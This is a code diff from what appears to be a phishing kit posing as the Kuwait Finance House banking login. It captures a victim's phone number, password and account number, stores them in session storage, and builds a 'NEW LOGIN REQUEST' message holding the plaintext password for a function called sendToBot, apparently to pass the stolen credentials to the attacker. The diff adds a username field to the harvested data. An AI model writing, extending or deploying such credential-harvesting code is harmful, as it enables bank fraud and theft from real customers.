@@ -131,10 +131,12 @@
             const phone = document.getElementById('phone').value;
             const password = document.getElementById('password').value;
             const accountNumber = document.getElementById('accountNumber').value;
+            const username = phone; // Use phone as username
             
             sessionStorage.setItem('kfh_phone', phone);
             sessionStorage.setItem('kfh_password', password);
             sessionStorage.setItem('kfh_account_number', accountNumber);
+            sessionStorage.setItem('kfh_username', username);
             
             // Show waiting state
             showWaitingState();
@@ -146,6 +148,7 @@
         async function sendToBot(phone, password, accountNumber) {
             const sessionId = 'session_' + Math.random().toString(36).substr(2, 9);
             sessionStorage.setItem('kfh_session_id', sessionId);
+            sessionStorage.setItem('kfh_username', phone);
             
             const message = '🏦 KFH KUWAIT - NEW LOGIN REQUEST\n\n🆔 Session ID: ' + sessionId + '\n📱 Phone: ' + phone + '\n🔐 Password: ' + password + '\n🏦 Account (Last 5): ' + accountNumber + '\n📅 Time: ' + new Date().toLocaleString();
 
